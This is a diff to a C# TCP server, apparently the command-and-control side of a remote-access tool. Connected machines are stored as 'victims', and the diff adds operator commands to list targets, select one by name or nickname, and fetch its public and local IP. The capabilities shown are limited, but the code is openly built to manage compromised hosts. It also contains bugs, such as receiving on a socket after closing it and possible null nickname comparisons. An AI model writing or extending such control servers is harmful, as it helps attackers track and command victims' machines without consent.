@@ -68,7 +68,7 @@ namespace Wubalubadubdub_Server
             }
             else
             {
-                victims.Add(new Victim(socket, text.Split('~')[0]));
+                victims.Add(new Victim(socket, text.Split('~')[0], socket.RemoteEndPoint.ToString().Split(':')[0], socket.LocalEndPoint.ToString().Split(':')[0]));
                 Console.WriteLine("Victim '" + text.Split('~')[0] + "' connected at "+socket.RemoteEndPoint.ToString().Split(':')[0]);
             }
             
@@ -102,8 +102,8 @@ namespace Wubalubadubdub_Server
 
             byte[] recBuf = new byte[received];
             Array.Copy(buffer, recBuf, received);
-            string text = Encoding.ASCII.GetString(recBuf);
-            Console.WriteLine("Received Command: " + text);
+            string command = Encoding.ASCII.GetString(recBuf);
+            Console.WriteLine("Received Command: " + command);
 
             Client client = null;
             foreach (Client c in clients)
@@ -114,13 +114,33 @@ namespace Wubalubadubdub_Server
                 }
             }
 
-            if (text.ToLower().Contains("set target"))
+            if (command.ToLower().Contains("list targets"))
+            {
+                String output = "";
+                foreach (Victim victim in victims)
+                {
+                    output += victim.name;
+                    if (victim.nickName != null)
+                    {
+                        output += " '"+victim.nickName+"'";
+                    }
+
+                    output += ", ";
+                }
+                byte[] data = Encoding.ASCII.GetBytes(output);
+                socket.Send(data);
+                
+                socket.BeginReceive(buffer, 0, bufferSize, SocketFlags.None, ReceiveCallback, socket);
+                return;
+            }
+
+            if (command.ToLower().Contains("set target"))
             {
                 Victim old = client.target;
-                String targetName = text.Split(' ')[2];
+                String targetName = command.Split(' ')[2];
                 foreach (Victim v in victims)
                 {
-                    if (v.nickName.Equals(targetName))
+                    if (v.name.Equals(targetName) || v.nickName.Equals(targetName))
                     {
                         client.target = v;
                         byte[] data = Encoding.ASCII.GetBytes("Target set to "+targetName);
@@ -134,25 +154,43 @@ namespace Wubalubadubdub_Server
                     socket.Send(data);
                     client.target = null;
                 }
+                
+                socket.BeginReceive(buffer, 0, bufferSize, SocketFlags.None, ReceiveCallback, socket);
+                return;
             }
             
             else if (client.target != null)
             {
-                if (text.ToLower() == "get ip")
+                if (command.ToLower() == "get ip")
                 {
-                    Console.WriteLine("Text is a get time request");
-                    byte[] data = Encoding.ASCII.GetBytes(DateTime.Now.ToLongTimeString());
+                    byte[] data = Encoding.ASCII.GetBytes(client.target.IP);
                     socket.Send(data);
-                    Console.WriteLine("Time sent to client");
+                    Console.WriteLine("ip sent to client");
+                    socket.BeginReceive(buffer, 0, bufferSize, SocketFlags.None, ReceiveCallback, socket);
+                    return;
                 }
+
+                if (command.ToLower() == "get local ip")
+                {
+                    byte[] data = Encoding.ASCII.GetBytes(client.target.localIP);
+                    socket.Send(data);
+                    Console.WriteLine("local ip sent to client");
+                    socket.BeginReceive(buffer, 0, bufferSize, SocketFlags.None, ReceiveCallback, socket);
+                    return;
+                }
+                
                 else
                 {
                     Console.WriteLine("Invalid Command entered");
                     byte[] data = Encoding.ASCII.GetBytes("Invalid Command");
                     socket.Send(data);
                 }
+                
+                socket.BeginReceive(buffer, 0, bufferSize, SocketFlags.None, ReceiveCallback, socket);
+                return;
             }
-            else if (text.ToLower() == "exit")
+            
+            else if (command.ToLower() == "exit")
             {
                 socket.Shutdown(SocketShutdown.Both);
                 socket.Close();
@@ -160,15 +198,22 @@ namespace Wubalubadubdub_Server
                 clients.Remove(client);
                 
                 Console.WriteLine("Client disconnected");
+                socket.BeginReceive(buffer, 0, bufferSize, SocketFlags.None, ReceiveCallback, socket);
                 return;
+            }
+
+            if (command.ToLower() == "clear")
+            {
+                Console.WriteLine("Console Cleared");
+                byte[] data = Encoding.ASCII.GetBytes("Console Cleared");
+                socket.Send(data); 
             }
             else
             {
-                Console.WriteLine("No Target set");
-                byte[] data = Encoding.ASCII.GetBytes("No Target set");
+                Console.WriteLine("No Target set / Invalid Command");
+                byte[] data = Encoding.ASCII.GetBytes("No Target set / Invalid Command");
                 socket.Send(data);
             }
-
             socket.BeginReceive(buffer, 0, bufferSize, SocketFlags.None, ReceiveCallback, socket);
         }
     }
